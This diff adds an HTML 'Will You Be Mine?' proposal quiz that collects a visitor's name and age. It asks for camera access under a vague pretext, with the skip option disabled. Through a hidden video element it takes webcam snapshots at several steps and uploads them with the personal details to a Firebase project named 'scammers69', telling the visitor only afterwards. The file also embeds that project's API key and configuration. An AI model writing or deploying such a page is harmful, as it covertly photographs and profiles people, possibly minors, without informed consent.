@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Will You Be Mine? 💖</title>
+
+<!-- Confetti -->
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+
+<style>
+body {margin:0;font-family:Arial;background:#ffe6e6;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;}
+.card {width:92%;max-width:420px;background:#fff;border-radius:14px;padding:22px;box-shadow:0 8px 24px rgba(0,0,0,.12);}
+h1 {color:#ff4d6d;margin:10px 0 20px;}
+input {width:90%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #ddd;font-size:16px;}
+button {padding:12px 18px;border:none;border-radius:10px;margin:8px;cursor:pointer;font-size:16px;}
+.primary {background:#007bff;color:#fff;}
+.yes {background:#28a745;color:#fff;}
+.no {background:#dc3545;color:#fff;}
+.muted {color:#666;font-size:13px;}
+#photo {width:100%;border-radius:10px;margin-top:10px;display:none;}
+.hidden {display:none;}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <!-- STEP 1 -->
+  <div id="step1">
+    <h1>Hey 💕</h1>
+    <input id="name" placeholder="Your name" />
+    <input id="age" type="number" placeholder="Your age" />
+    <br>
+    <button class="primary" onclick="goToStep2()">Continue ➡️</button>
+  </div>
+
+  <!-- STEP 2 -->
+  <div id="step2" class="hidden">
+    <h1>Quick thing 😄</h1>
+    <p class="muted">I want to know your cute answer for these questions.<br>Shall we start?</p>
+    <button class="primary" onclick="startCamera()">Start 😏</button><br>
+    <button class="primary" onclick="startCamera()">Let's go 😏</button><br>
+    <!--<button onclick="skipCamera()">Skip</button>-->
+  </div>
+
+  <!-- STEP 3 -->
+  <div id="step3" class="hidden">
+    <h1 id="question">Will you be mine? ❤️</h1>
+    <div>
+      <button id="yesBtn" class="yes">Yes 💖</button>
+      <button id="noBtn" class="no">No 💔</button>
+    </div>
+  </div>
+
+  <!-- REACTION -->
+  <div id="reaction" class="hidden">
+    <h1>Be honest… 😏</h1>
+    <button id="smileBtn">😄 I smiled</button>
+    <button id="blushBtn">😳 I blushed</button>
+    <button id="liarBtn">🙄 No (liar)</button>
+  </div>
+
+  <img id="photo" />
+</div>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyAivrTp4Mu8-PPxdWdPErNwkb3FUAjmcPs",
+  authDomain: "scammers69.firebaseapp.com",
+  databaseURL: "https://scammers69-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "scammers69",
+  storageBucket: "scammers69.firebasestorage.app",
+  messagingSenderId: "344596974081",
+  appId: "1:344596974081:web:f005290bc445f28c308e00"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+// Variables
+let currentUser="", yesBtn,noBtn, yesSize=16,noCount=0,idx=0,screenshots=[],screenshotInterval=null,stream=null;
+const noMessages=["No 💔","Sure? 😢","Really? 🥺","Are you sure? 😭","Think again 😣","Very sure? 😩","You broke my heart 💔","Think babe 😔"];
+let video = document.createElement('video');
+video.autoplay = true; video.playsInline = true; video.style.display='none'; document.body.appendChild(video);
+
+// STEP NAVIGATION
+function goToStep2() {
+  const name=document.getElementById("name").value.trim();
+  const age=document.getElementById("age").value.trim();
+  if(!name||!age){alert("Please enter name and age 🙂"); return;}
+  currentUser=name;
+  document.getElementById("step1").classList.add("hidden");
+  document.getElementById("step2").classList.remove("hidden");
+}
+async function startCamera() {
+  try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}); video.srcObject=stream;}catch(e){console.warn("Camera denied");}
+  document.getElementById("step2").classList.add("hidden");
+  showProposal(); takeScreenshot("initial");
+}
+function skipCamera(){document.getElementById("step2").classList.add("hidden"); showProposal();}
+
+// PROPOSAL
+function showProposal(){
+  document.getElementById("step3").classList.remove("hidden");
+  yesBtn=document.getElementById("yesBtn"); noBtn=document.getElementById("noBtn");
+
+  noBtn.onclick=()=>{
+    noCount++; yesSize+=8; yesBtn.style.fontSize=yesSize+"px"; yesBtn.style.padding=(yesSize/2)+"px "+yesSize+"px";
+    idx=(idx+1)%noMessages.length; noBtn.innerText=noMessages[idx];
+  };
+
+  yesBtn.onclick=()=>{
+    confetti({particleCount:140,spread:70,origin:{y:0.6}});
+    document.getElementById("step3").classList.add("hidden");
+    document.getElementById("reaction").classList.remove("hidden");
+    takeScreenshot("yes_clicked");
+  };
+
+  // Attach reaction buttons AFTER they exist
+  document.getElementById("smileBtn").onclick=()=>sendReaction("smile");
+  document.getElementById("blushBtn").onclick=()=>sendReaction("blush");
+  document.getElementById("liarBtn").onclick=()=>sendReaction("liar");
+}
+
+// SCREENSHOT
+function takeScreenshot(type){
+  if(!video.srcObject) return null;
+  const canvas=document.createElement("canvas");
+  canvas.width=video.videoWidth||640; canvas.height=video.videoHeight||480;
+  canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
+  const dataURL=canvas.toDataURL("image/jpeg",0.6);
+  screenshots.push({data:dataURL,timestamp:new Date(),type:type});
+  return dataURL;
+}
+
+// SEND REACTION
+async function sendReaction(type){
+  takeScreenshot(`reaction_${type}`);
+  const age=document.getElementById("age").value || "unknown";
+  try{
+    const proposalRef=await db.collection('proposals').add({user:currentUser,age,noCount,reaction:type,timestamp:new Date(),totalScreenshots:screenshots.length});
+    for(let i=0;i<screenshots.length;i++){
+      await db.collection('proposalScreenshots').add({proposalId:proposalRef.id,user:currentUser,screenshotIndex:i,type:screenshots[i].type,timestamp:screenshots[i].timestamp,screenshotData:screenshots[i].data.substring(0,500000)});
+    }
+    const lastShot=screenshots[screenshots.length-1];
+    if(lastShot){const photo=document.getElementById("photo");photo.src=lastShot.data;photo.style.display="block";}
+    alert("Aww 😍 Your reaction was captured!");
+  }catch(e){console.error(e);}
+}
+
+// CLEANUP
+window.addEventListener('beforeunload',()=>{
+  if(screenshotInterval) clearInterval(screenshotInterval);
+  if(stream) stream.getTracks().forEach(track=>track.stop());
+});
+</script>
+</body>
+</html>
